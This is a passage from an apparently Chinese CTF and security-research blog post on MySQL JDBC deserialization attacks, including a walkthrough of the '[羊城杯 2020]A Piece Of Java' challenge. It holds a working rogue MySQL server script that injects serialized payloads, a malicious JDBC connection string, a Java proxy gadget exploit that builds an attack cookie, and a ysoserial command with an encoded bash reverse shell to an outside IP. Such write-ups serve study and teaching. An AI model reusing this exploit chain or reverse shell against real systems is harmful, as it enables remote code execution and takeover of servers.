run():<br><br>    while 1:<br>        conn, addr = sk.accept()<br>        print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1]))<br><br>        # 1.先发送第一个 问候报文<br>        send_data(conn,greeting_data)<br><br>        while True:<br>            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok<br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            #其他过程<br>            data=receive_data(conn)<br>            #查询一些配置信息,其中会发送自己的 版本号<br>            if &quot;session.auto_increment_increment&quot; in data:<br>                _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;<br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            elif &quot;show warnings&quot; in data:<br>                _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;<br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            if &quot;set names&quot; in data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            if &quot;set character_set_results&quot; in data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            if &quot;show session status&quot; in data:<br>                mysql_data = &#x27;0100000102&#x27;  #列数量为2<br>                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;   #第一列定义Variable_name<br>                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;  #第二列定义 Value<br>                #获取payload<br>                payload_content=get_payload_content()<br>                #计算payload长度<br>                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)<br>                payload_length_hex = payload_length[2:4] + payload_length[0:2]<br>                #计算数据包长度<br>                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)<br>                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]<br>                mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex<br>                mysql_data += str(payload_content)<br>                mysql_data += &#x27;07000005fe000022000100&#x27;<br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            if &quot;show warnings&quot; in data:<br>                payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;<br>                send_data(conn, payload)<br>            break<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    HOST =&#x27;0.0.0.0&#x27;<br>    PORT = 3309<br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间<br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<br>    sk.bind((HOST, PORT))<br>    sk.listen(1)<br><br>    print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>Client</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.sql.*;<br><br>public class Jdbc_client &#123;<br><br>    public static void main(String[] args) throws Exception&#123;<br>        String driver = &quot;com.mysql.cj.jdbc.Driver&quot;;<br>        String DB_URL = &quot;jdbc:mysql://103.218.242.206:3309/?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;;//8.x使用<br><br>        Class.forName(driver);<br>        Connection conn = DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是整个过程中client与fake mysql serve的交互过程(蓝底是serve发送，红底是client发送)</p>
+<p><img src="/./images/image-20260412170227204.png" alt="image-20260412170227204"></p>
+<p>在调试的过程中我发现</p>
+<p><img src="/./images/image-20260412172228837.png" alt="image-20260412172228837"></p>
+<p>rs.getObject(2)才会真正触发readObject,这是什么原因，我们再深入看看</p>
+<p>在执行SHOW SESSION STATUS，结果通常为两列Variable_name 和 Value</p>
+<p><img src="/./images/image-20260412175523713.png" alt="image-20260412175523713"></p>
+<p>传入1表示获取Variable_name的数据，传入2代表获取Value的数据，可是接下来<code>int columnIndexMinusOne = columnIndex - 1</code>为了兼容底层数组的索引，一般从0开始</p>
+<p>而往往反序列化的恶意数据在Value处，但我很好奇这个恶意数据是什么时候放入的？</p>
+<blockquote>
+<p>前面提到JDBC内部的拦截器在Client执行一个查询语句时会进行一次拦截，先发送SHOW SESSION STATUS，而当我们的脚本中一旦检测到<code>if &quot;show session status&quot; in data:</code>,就会将恶意的硬编码payload_content拼接到mysql_data的末尾</p>
+</blockquote>
+<p>不过细心的我们还会发现，在payload_content后面还拼接着<code>07000005fe000022000100</code>,问了ai，是EOF Packet(结束包).可是翻看了结果集响应包的结构图，这个响应包一般出现在”元数据”和”数据行”,但是后续数据行结束也可以添加EOF Packet(结束包)。</p>
+<p>这时我突然意识到原作者的疑问，他原本在”元数据”和”数据行”中间也添加了EOF，这本该更符合协议格式，作者却说报错了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if &quot;show session status&quot; in data:<br>    # 1. 列数量包 (ID 1)<br>                mysql_data = &#x27;0100000102&#x27; <br>    <br>    # 2. 列定义包 1 (ID 2)<br>                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;<br>    <br>    # 3. 列定义包 2 (ID 3)<br>                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;<br>    <br>    # 4. 中间 EOF (ID 4) - 必须是 04<br>                mysql_data += &#x27;07000004fe000022000100&#x27;<br>    <br>    # 5. 数据行包 (ID 5)<br>                payload_content = get_payload_content()<br>    # ... 长度计算逻辑 ...<br>                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)<br>                payload_length_hex = payload_length[2:4] + payload_length[0:2]<br>                #计算数据包长度<br>                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)<br>                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]<br>    # 注意这里的 &#x27;05&#x27;<br>                mysql_data += data_len_hex + &#x27;05&#x27; + &#x27;fbfc&#x27;+ payload_length_hex<br>                mysql_data += str(payload_content)<br>    <br>    # 6. 最终 EOF (ID 6) - 必须是 06<br>                mysql_data += &#x27;07000006fe000022000100&#x27;<br>    <br>                send_data(conn, mysql_data) <br>                data = receive_data(conn)<br></code></pre></td></tr></table></figure>
+
+<p>经过测试最终的确不能反弹calc,遇事不决就去调试</p>
+<p><img src="/./images/image-20260412184456263.png" alt="image-20260412184456263"></p>
+<p>发现这步rs.next()&#x3D;&#x3D;0，导致无法调用getObject.</p>
+<p>终于在com.mysql.cj.protocol.a.NativeServerSession类下发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public boolean isEOFDeprecated() &#123;<br>    return (this.clientParam &amp; 16777216L) != 0L;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>取决于this.clientParam的值与16777216L（这就是十六进制的 <code>0x01000000</code>，二进制 0000 0001 0000 0000 0000 0000 0000 0000 )</p>
+<p>而this.clientParam的值取决于greeting_data的能力标志位(mysql.caps.server)，而能力标志位是四字节，对于我本地<code>4a0000000a352e352e3533000a0000004c45545940744a5100fff72102000f8015000000000000000000003969267c61504f7b406a7736006d7973716c5f6e61746976655f70617373776f726400</code> （注意端序问题） 800f f7ff  –&gt; 1000 0000 0000 1111 1111 0111 1111 1111 第25位为0</p>
+<p><img src="/./images/image-20260412192020232.png" alt="image-20260412192020232"></p>
+<p>对于作者的greeting_data <code>4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400</code>能力位为  81ff f7ff  —&gt;1000 0001 1111 1111 1111 0111 1111 1111   ,第25位为1，即丢弃EOF包</p>
+<h2 id="例题-羊城杯-2020-A-Piece-Of-Java"><a href="#例题-羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="例题  [羊城杯 2020]A Piece Of Java"></a>例题  [羊城杯 2020]A Piece Of Java</h2><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p><code>jar -xvf web-0.0.1-SNAPSHOT.jar</code> 解压jar包</p>
+<p>首先将jar包打开于idea，其中BOOT-INF&#x2F;classes&#x2F;包含业务代码，META-INF中的pom.xml则用来查看导入了哪些依赖（BOOT-INF&#x2F;lib&#x2F;中依赖一般更多）</p>
+<p><img src="/./images/image-20260413123432629.png" alt="image-20260413123432629"></p>
+<p>我手动将BOOT-INF&#x2F;classes&#x2F;下的文件导入idea,方便后续编写exp </p>
+<p><code>gdufs.challenge.web.controller.MainController</code>是一个起始页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">@Controller<br>public class MainController &#123;<br>    public MainController() &#123;<br>    &#125;<br><br>    @GetMapping(&#123;&quot;/index&quot;&#125;)<br>    public String index(@CookieValue(value = &quot;data&quot;,required = false) String cookieData) &#123;<br>        return cookieData != null &amp;&amp; !cookieData.equals(&quot;&quot;) ? &quot;redirect:/hello&quot; : &quot;index&quot;;<br>    &#125;<br><br>    @PostMapping(&#123;&quot;/index&quot;&#125;)<br>    public String index(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, HttpServletResponse response) &#123;<br>        UserInfo userinfo = new UserInfo();<br>        userinfo.setUsername(username);<br>        userinfo.setPassword(password);<br>        Cookie cookie = new Cookie(&quot;data&quot;, this.serialize(userinfo));<br>        cookie.setMaxAge(2592000);<br>        response.addCookie(cookie);<br>        return &quot;redirect:/hello&quot;;<br>    &#125;<br><br>    @GetMapping(&#123;&quot;/hello&quot;&#125;)<br>    public String hello(@CookieValue(value = &quot;data&quot;,required = false) String cookieData, Model model) &#123;<br>        if (cookieData != null &amp;&amp; !cookieData.equals(&quot;&quot;)) &#123;<br>            Info info = (Info)this.deserialize(cookieData);<br>            if (info != null) &#123;<br>                model.addAttribute(&quot;info&quot;, info.getAllInfo());<br>            &#125;<br><br>            return &quot;hello&quot;;<br>        &#125; else &#123;<br>            return &quot;redirect:/index&quot;;<br>        &#125;<br>    &#125;<br><br>    private String serialize(Object obj) &#123;<br>        ByteArrayOutputStream baos = new ByteArrayOutputStream();<br><br>        try &#123;<br>            ObjectOutputStream oos = new ObjectOutputStream(baos);<br>            oos.writeObject(obj);<br>            oos.close();<br>        &#125; catch (Exception var4) &#123;<br>            var4.printStackTrace();<br>            return null;<br>        &#125;<br><br>        return new String(Base64.getEncoder().encode(baos.toByteArray()));<br>    &#125;<br><br>    private Object deserialize(String base64data) &#123;<br>        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));<br><br>        try &#123;<br>            ObjectInputStream ois = new SerialKiller(bais, &quot;serialkiller.conf&quot;);<br>            Object obj = ois.readObject();<br>            ois.close();<br>            return obj;<br>        &#125; catch (Exception var5) &#123;<br>            var5.printStackTrace();<br>            return null;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>路由的逻辑还是比较清晰，看到&#x2F;hello路由下<code>Info info = (Info)this.deserialize(cookieData);</code> ,似乎我们可以直接构造恶意cookieData，不过在deserialize方法中，<code>ObjectInputStream ois = new SerialKiller(bais, &quot;serialkiller.conf&quot;);</code>这个是<strong>SerialKiller 库</strong>为了防止恶意反序列化的waf，配置信息在serialkiller.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!-- serialkiller.conf --&gt;<br>&lt;config&gt;<br>    &lt;refresh&gt;6000&lt;/refresh&gt;<br>    &lt;mode&gt;<br>        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;<br>        &lt;profiling&gt;false&lt;/profiling&gt;<br>    &lt;/mode&gt;<br>    &lt;blacklist&gt;<br><br>    &lt;/blacklist&gt;<br>    &lt;whitelist&gt;<br>        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;<br>        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;<br>    &lt;/whitelist&gt;<br>&lt;/config&gt;<br></code></pre></td></tr></table></figure>
+
+<p>只允许匹配gdufs..*  ，java.lang..*，意味着只允许反序列化特定类 (<code>java.lang和gdufs</code>两个路径的类),这就导致我们无法直接使用cc链（即便依赖中存在cc链）</p>
+<blockquote>
+<p>Java 的反射相关类大多都在 <code>java.lang.reflect</code> 包下</p>
+</blockquote>
+<p>在<code>gdufs.challenge.web.model.DatabaseInfo</code>中发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void connect() &#123;<br>        String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;;<br><br>        try &#123;<br>            this.connection = DriverManager.getConnection(url);<br>        &#125; catch (Exception var3) &#123;<br>            var3.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    public Boolean checkAllInfo() &#123;<br>        if (this.host != null &amp;&amp; this.port != null &amp;&amp; this.username != null &amp;&amp; this.password != null) &#123;<br>            if (this.connection == null) &#123;<br>                this.connect();<br>            &#125;<br><br>            return true;<br>        &#125; else &#123;<br>            return false;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>是不是顿时恍然大悟，并且username和password没有任何过滤，允许我们自定义输入，和之前讲到的Jdbc_client类似，同时在依赖中发现mysql-connect-8.0.19，这个时候就会想到通过JDBC反序列化实现rce</p>
+<h3 id="构造gadget"><a href="#构造gadget" class="headerlink" title="构造gadget"></a>构造gadget</h3><p>想要触发connect(),我们可以看到checkAllInfo()中调用了connect()方法。而在<code>gdufs.challenge.web.invocation.InfoInvocationHandler</code>中的invoke方法调用了checkALLInfo()。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public Object invoke(Object proxy, Method method, Object[] args) &#123;<br>    try &#123;<br>        return method.getName().equals(&quot;getAllInfo&quot;) &amp;&amp; !this.info.checkAllInfo() ? null : method.invoke(this.info, args);<br>    &#125; catch (Exception var5) &#123;<br>        var5.printStackTrace();<br>        return null;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于调用invoke方法，这里可以使用动态代理，动态代理底层调用的是<code>InvocationHandler</code>类，调用被代理类的任意方法都会触发它的<code>invoke</code>方法，所以在序列化写入的时候会自动调用<code>invoke</code>方法</p>
+<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a><strong>动态代理</strong></h4><p>如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法__call的效果就要用到<code>java.lang.reflect.Proxy</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Info infoproxy = (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);<br><br></code></pre></td></tr></table></figure>
+
+<p>Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑</p>
+<p>举个例子 ExampleInvocationHandler类实现了InvocationHandler</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Method;<br>import java.util.Map;<br>public class ExampleInvocationHandler implements InvocationHandler &#123;<br>    protected Map map;<br>    public ExampleInvocationHandler(Map map) &#123;<br>        this.map = map;<br>   &#125;<br>    @Override<br>    public Object invoke(Object proxy, Method method, Object[] args) throws <br>Throwable &#123;<br>        if (method.getName().compareTo(&quot;get&quot;) == 0) &#123;<br>           System.out.println(&quot;Hook method: &quot; + method.getName());<br>            return &quot;Hacked Object&quot;;<br>       &#125;<br>        return method.invoke(this.map, args);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br>import java.util.HashMap;<br>import java.util.Map;<br><br>public class App &#123;<br>public static void main(String[] args) throws Exception &#123;<br>    InvocationHandler handler = new ExampleInvocationHandler(new HashMap());  //调用代理，new HashMap()是被代理的对象<br>    Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);<br>    proxyMap.put(&quot;hello&quot;, &quot;world&quot;);<br>    String result = (String) proxyMap.get(&quot;hello&quot;);<br>System.out.println(result);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行后结果为</p>
+<blockquote>
+<p>Hook method: get<br>Hacked Object</p>
+</blockquote>
+<p>原本应该返回world,但获取的是 Hacked Object。原因也正是proxyMap这个劫持了被代理对象Map内部的get方法</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package gdufs.challenge.web;<br><br>import gdufs.challenge.web.invocation.InfoInvocationHandler;<br>import gdufs.challenge.web.model.DatabaseInfo;<br>import gdufs.challenge.web.model.Info;<br>import java.io.ByteArrayOutputStream;<br>import java.io.IOException;<br>import java.io.ObjectOutputStream;<br>import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br>import java.util.Base64;<br>public class exp &#123;<br>    public static void main(String[] args) throws IOException &#123;<br>        DatabaseInfo databaseInfo = new DatabaseInfo();<br>        databaseInfo.setHost(&quot;103.218.242.206&quot;);<br>        databaseInfo.setPort(&quot;3309&quot;);<br>        databaseInfo.setUsername(&quot;q1ng&quot;);<br>  databaseInfo.setPassword(&quot;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);<br>        InvocationHandler infoInvocationHandler = (InvocationHandler) new InfoInvocationHandler(databaseInfo);<br>        Info infoproxy = (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);<br>        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(infoproxy);<br>        String poc=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.println(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>fake mysql serve还是上面的poc,不过payload改成反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar ysoserial.jar CommonsCollections7 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuMjE4LjI0Mi4yMDYvOTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload.bin<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">with open (&#x27;payload.bin&#x27;,&#x27;rb&#x27;) as f:<br>...   content = f.read()<br>...   hex_data = binascii.hexlify(content).decode(&#x27;utf-8&#x27;)<br>...   print(hex_data)<br></code></pre></td></tr></table></figure>
+
+<p>fake mysql serve</p>
+<p><img src="/./images/image-20260413193834395.png" alt="image-20260413193834395"></p>
+<p>反弹shell</p>
+<p><img src="/./images/image-20260413193920768.png" alt="image-20260413193920768"></p>
+<h3 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h3><p>看到大佬的wp中除了jdbc反序列化 to rce ,还有 to 任意文件读取的思路 </p>
+<blockquote>
+<p> <code>https://github.com/rmb122/rogue_mysql_server</code> 具体配置按 <code>Readme</code></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDBC"><span class="toc-number">2.</span> <span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">gadget链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8Fmysql%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">构造恶意mysql服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.3.</span> <span class="toc-text">poc</span></a></li><li 